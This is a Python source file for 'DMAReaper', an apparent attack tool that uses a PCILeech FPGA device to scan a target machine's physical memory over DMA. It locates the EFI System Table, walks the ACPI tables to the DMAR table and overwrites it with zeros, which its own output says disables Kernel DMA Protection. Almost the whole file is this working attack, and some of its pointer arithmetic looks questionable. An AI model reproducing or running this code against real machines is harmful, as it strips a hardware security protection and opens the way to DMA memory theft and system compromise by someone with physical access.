#!/usr/bin/env python3

# Created by Pierre-Nicolas Allard-Coutu
# https://github.com/pn-tester/DMAReaper
# For use with PCILeech firmware via compatible FPGA device
# PCILeech Framework and LeechCore library created by : Ulf Frisk 

import sys
import struct
import argparse
import leechcorepyc as leech

# ACPI 2.0 Table GUID in mixed-endian format
ACPI20_GUID = bytes([
    0x71, 0xE8, 0x68, 0x88,
    0xF1, 0xE4,
    0xD3, 0x11,
    0xBC, 0x22, 0x00, 0x80, 0xC7, 0x3C, 0x88, 0x81
])

PAGE_SIZE = 0x1000
RAM_SIZE = 64 * 1024 * 1024 * 1024  # 64 GB
DEFAULT_START_ADDR = 0x52000000
BATCH_SIZE = 100
EFI_SIG = b'IBI SYST'  # EFI System Table signature (little endian)

banner = r"""
 _____  _______ _______ ______                               
|     \|   |   |   _   |   __ \.-----.---.-.-----.-----.----.
|  --  |       |       |      <|  -__|  _  |  _  |  -__|   _|
|_____/|__|_|__|___|___|___|__||_____|___._|   __|_____|__|  
                                           |__|               
Created By : PN-TESTER
"""

args = None

def debug(msg):
    if args.verbose:
        print(msg)

def hexdump(data, base=0):
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_bytes = ' '.join(f'{b:02X}' for b in chunk)
        ascii_repr = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        print(f"{base+i:016X}  {hex_bytes:<48}  {ascii_repr}")

try:
    # Initialize LeechCore globally
    lc = leech.LeechCore("fpga")
except:
    print(banner)
    print("[-] Unable to initialize device")
    exit(0)

def extract_exit_boot_services(lc, efi_table_data, efi_table_addr):
    try:
        if len(efi_table_data) < 0x60:
            debug(f"[!] EFI Table too small to parse at 0x{efi_table_addr:016X}")
            return None

        revision = struct.unpack_from("<I", efi_table_data, 0x20)[0]
        bs_ptr = struct.unpack_from("<Q", efi_table_data, 0x60)[0]

        if revision == 0 or bs_ptr == 0 or bs_ptr % 8 != 0:
            debug(f"[!] Invalid EFI Table revision ({revision}) or BootServices pointer (0x{bs_ptr:016X}).")
            return None

        print(f"\n[+] EFI Table Revision: 0x{revision:08X}")
        print(f"[+] EFI_BOOT_SERVICES pointer: 0x{bs_ptr:016X}")

        bs_data = lc.read(bs_ptr, 0x100, True)
        if not bs_data or all(b == 0 for b in bs_data):
            debug(f"[!] EFI_BOOT_SERVICES structure is empty or unreadable.")
            return None

        exitboot_ptr = struct.unpack_from("<Q", bs_data, 0xE8)[0]
        if exitboot_ptr == 0:
            return None

        return exitboot_ptr, bs_ptr

    except Exception as e:
        debug(f"[!] Exception while parsing EFI structures: {e}")
        return None

def search_for_efi_table():
    addresses = list(range(args.min_addr, args.max_addr, PAGE_SIZE * BATCH_SIZE))

    for base_addr in addresses:
        batch_addrs = [base_addr + i * PAGE_SIZE for i in range(BATCH_SIZE)]
        range_end = batch_addrs[-1] + PAGE_SIZE

        print(f"[*] Scanning range: 0x{base_addr:016X} - 0x{range_end:016X}")
        pages = lc.read_scatter(batch_addrs)

        for page in pages:
            addr = page['addr']
            data = page['data']
            if not data or len(data) < 0x60:
                continue

            if EFI_SIG in data:
                offset = data.find(EFI_SIG)
                abs_addr = addr + offset
                print(f"\n[+] EFI System Table Candidate found at 0x{abs_addr:016X}\n")
                hexdump(data[offset:offset+0x80], base=abs_addr)

                result = extract_exit_boot_services(lc, data[offset:], abs_addr)
                if result:
                    print("[+] Valid EFI System Table")
                    return abs_addr
                else:
                    print("\n[!] False positive — continuing search...\n")

    print("[!] EFI System Table not found in scanned memory.")
    return None

def read_bytes(addr: int, size: int) -> bytes:
    data = lc.read(addr, size, True)
    if not data or len(data) != size:
        raise IOError(f"Read {size} bytes at 0x{addr:016x} failed")
    return data

def read_u64(addr: int) -> int:
    return struct.unpack_from("<Q", read_bytes(addr, 8))[0]

def read_u32(addr: int) -> int:
    return struct.unpack_from("<I", read_bytes(addr, 4))[0]

def find_acpi_vendor_table(efi_system_table_addr: int):
    boot_services_ptr = read_u64(efi_system_table_addr + 0x60)
    entries = read_u64(efi_system_table_addr + 0x68)
    cfg_tbl_ptr = read_u64(efi_system_table_addr + 0x70)

    print(f"[+] BootServices pointer: 0x{boot_services_ptr:016x}")
    print(f"[+] Config table entries: {entries}")
    print(f"[+] Config table pointer: 0x{cfg_tbl_ptr:016x}")

    # Verbose hexdump of the whole configuration table block
    if args.verbose:
        total_cfg_size = entries * 24
        cfg_data = read_bytes(cfg_tbl_ptr, total_cfg_size)
        print(f"\n[+] Hexdump of Configuration Table (entries x 24 bytes = {total_cfg_size} bytes) at 0x{cfg_tbl_ptr:016x}:\n")
        hexdump(cfg_data, base=cfg_tbl_ptr)

    cur = cfg_tbl_ptr
    for i in range(entries):
        guid_bytes = read_bytes(cur, 16)
        if guid_bytes == ACPI20_GUID:
            vendor_table_ptr_32 = read_u32(cur + 16)
            vendor_table_ptr = vendor_table_ptr_32
            print(f"[+] ACPI 2.0 GUID matched at entry {i}")
            print(f"[+] VendorTable pointer: 0x{vendor_table_ptr:08x}")

            if args.verbose:
                # RSDP (Vendor Table) size is typically 36 or 40 bytes (acpi 2.0+)
                # Let's read 40 bytes to be safe
                rsdp_data = read_bytes(vendor_table_ptr, 40)
                print(f"\n[+] Hexdump of Vendor Table (RSDP) at 0x{vendor_table_ptr:08x}:\n")
                hexdump(rsdp_data, base=vendor_table_ptr)

            return vendor_table_ptr
        cur += 24

    print("[-] ACPI 2.0 GUID not found in config table entries")
    return None

def find_dmar_from_rsdp(rsdp_addr: int):
    rsdt_32 = read_u32(rsdp_addr - 4)
    rsdt_addr = rsdt_32

    rsdt_len = read_u32(rsdt_addr + 4)
    print(f"[+] RSDT pointer: 0x{rsdt_addr:016x}, length = {rsdt_len}")

    if args.verbose:
        rsdt_data = read_bytes(rsdt_addr, rsdt_len)
        print(f"\n[+] Hexdump of RSDT (length {rsdt_len} bytes) at 0x{rsdt_addr:016x}:\n")
        hexdump(rsdt_data, base=rsdt_addr)

    if rsdt_len < 40:
        print("[-] RSDT length too small")
        return None

    entry_count = (rsdt_len - 40) // 4
    entry_base = rsdt_addr + 40

    for i in range(entry_count):
        subtable_ptr_32 = read_u32(entry_base + i * 4)
        subtable_ptr = subtable_ptr_32

        sig = read_bytes(subtable_ptr, 4)
        sig_str = sig.decode('ascii', errors='ignore')

        if sig_str == 'DMAR':
            print(f"[+] DMAR table found at 0x{subtable_ptr:016x}")
            return subtable_ptr

    print("[-] DMAR table not found in RSDT")
    return None

def killDMARACPI(dmar_ptr):
    if dmar_ptr is None:
        print("[!] No DMAR pointer provided to overwrite function")
        return
    try:
        zero_bytes = b'\x00' * 64
        lc.write(dmar_ptr, zero_bytes)
        print("[+] Overwrite successful")
        print("[+] Kernel DMA Protection disabled")
    except Exception as e:
        print(f"[!] DMAR overwrite failure: {e}")

def parse_args():
    parser = argparse.ArgumentParser(description="DMAReaper — Disable Kernel DMA Protection via DMAR overwrite")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose debug output")
    parser.add_argument("-min", "--min-addr", type=lambda x: int(x, 0), default=DEFAULT_START_ADDR, help="Minimum scan address (default: 0x52000000)")
    parser.add_argument("-max", "--max-addr", type=lambda x: int(x, 0), default=RAM_SIZE, help="Maximum scan address (default: 64GB)")
    return parser.parse_args()

def main():
    global args
    args = parse_args()

    print(banner)
    efi_system_table_addr = search_for_efi_table()
    if not efi_system_table_addr:
        print("[!] EFI System Table not found, aborting.")
        sys.exit(1)

    rsdp_ptr = find_acpi_vendor_table(efi_system_table_addr)
    if not rsdp_ptr:
        print("[!] ACPI 2.0 Vendor Table not found, aborting.")
        sys.exit(1)

    dmar_ptr = find_dmar_from_rsdp(rsdp_ptr)
    if not dmar_ptr:
        print("[!] DMAR Table not found, aborting.")
        sys.exit(1)

    killDMARACPI(dmar_ptr)

if __name__ == "__main__":
    main()